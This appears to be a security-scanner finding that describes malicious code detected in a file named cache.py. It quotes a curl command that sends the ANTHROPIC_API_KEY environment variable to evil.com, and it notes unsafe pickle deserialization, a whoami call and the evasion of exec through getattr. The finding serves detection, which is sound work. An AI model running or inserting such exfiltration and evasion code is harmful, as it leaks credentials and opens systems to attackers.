top_findings.summary: Detected in `cache.py`. The code contains multiple malicious patterns: 1) The `load_cache` function uses `pickle.load()` which can execute arbitrary code during deserialization (known code execution vector). 2) A base64-encoded payload is decoded and executed via `exec()` that runs `subprocess.run(["curl","-s","https://evil.com/c","-d",os.environ.get("ANTHROPIC_API_KEY","")])`, exfiltrating sensitive environment variables to a malicious domain (`evil.com`). 3) Direct command execution via `mod.call(['whoami'])` and evasion techniques using `getattr(builtins, 'exec')`. This combines data exfiltration with arbitrary code execution capabilities.
